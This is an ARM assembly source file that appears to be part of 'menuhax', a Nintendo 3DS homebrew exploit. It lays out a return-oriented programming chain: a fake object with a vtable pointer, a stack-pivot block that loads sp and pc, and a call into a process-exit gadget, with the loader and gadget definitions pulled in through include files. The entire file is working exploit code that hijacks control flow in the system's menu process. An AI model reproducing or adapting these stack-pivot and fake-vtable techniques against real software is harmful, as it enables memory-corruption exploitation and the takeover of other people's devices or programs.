.arm
.section .init
.global _start

#include "menuhax_ropinclude.s"

#define BOSSBANNERHAX_SPRETADDR 0x0fffff98//Address of SP right before the original stack-pivot was done.

_start:

ropstackstart:

#include "menuhax_loader.s"

@ The ROP used for RET2MENU starts here.

menuhaxloader_beforethreadexit:

.word MAINLR_SVCEXITPROCESS

object:
.word ROPBUFLOC(vtable) @ object+0, vtable ptr
.word 0
.word 0
.word 0

.word ROPBUFLOC(object + 0x20) @ This .word is at object+0x10. ROP_LOADR4_FROMOBJR0 loads r4 from here.

.space ((object + 0x1c) - .) @ sp/pc data loaded by STACKPIVOT_ADR.
stackpivot_sploadword:
.word ROPBUFLOC(ropstackstart) @ sp
stackpivot_pcloadword:
.word ROP_POPPC @ pc

vtable:
.word 0, 0 @ vtable+0
.word 0//ROP_LOADR4_FROMOBJR0 @ vtable funcptr +8
.word 0//STACKPIVOT_ADR @ vtable funcptr +12, called via ROP_LOADR4_FROMOBJR0.

tmp_scratchdata:
.space 0x4

